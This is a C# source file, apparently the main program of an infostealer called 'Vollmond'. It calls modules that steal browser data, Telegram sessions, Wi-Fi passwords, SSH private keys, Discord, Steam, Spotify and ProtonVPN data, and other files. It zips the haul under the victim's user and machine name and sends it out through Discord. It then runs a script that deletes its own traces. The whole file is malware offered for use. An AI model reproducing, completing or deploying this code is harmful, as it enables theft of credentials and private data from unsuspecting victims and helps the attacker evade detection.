using System.IO.Compression;
using Vollmond.Browsers;
using Vollmond.games;
using Vollmond.messengers;
using Vollmond.Minecraft;
using Vollmond.Streaming_platforms;
using Vollmond.VPN;

namespace Vollmond
{
    internal static class Program
    {
        public static string zipPath = Path.Combine(Path.GetTempPath(), $"{Environment.UserName}@{Environment.MachineName}.zip");
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static public async Task<int> Main()
        {
            if (Clear_Traces.TracesExists())
            {
                Clear_Traces.Clear_traces();
            }

            try
            {
                Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data"));

                // Stealing data

                StealAllBrowsers.Steal();
                StealTelegram.StealSession();
                UTorrent.StealCurrentTorrents();
                Wifi_PWS.WifiPwStealer.Steal();
                GitAgent.Steal(); // Steal the private openssh keys
                GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
                Spotify.Steal();
                discord.Steal();
                Steam.Steal(); // Makes a directory "games" (Nota bene)


                // Time to complete processes
                Thread.Sleep(5000);

                // Creating archive
                    ZipFile.CreateFromDirectory(
                        Path.Combine(Path.GetTempPath(), "Grabed_Data"),
                        zipPath,
                        CompressionLevel.SmallestSize,
                        false
                    );

                // Sending archive

                await SendToDiscord.SendAsync();
                SendToDiscord.SendAsync().Wait();

                //if (URLs.is_need_rickroll == true)
                //{
                //    Auxiliary.play_rick.Start();
                //    MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
                //        MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                //}
            }
            finally
            {
                // Removing files after user tap any button in messageBox
                try
                {
                    Clear_Traces.Clear_traces(); // Bat script what delete all traces and delete himself when ending work
                }
                catch { }

            }

            return 1;
        }
    }
}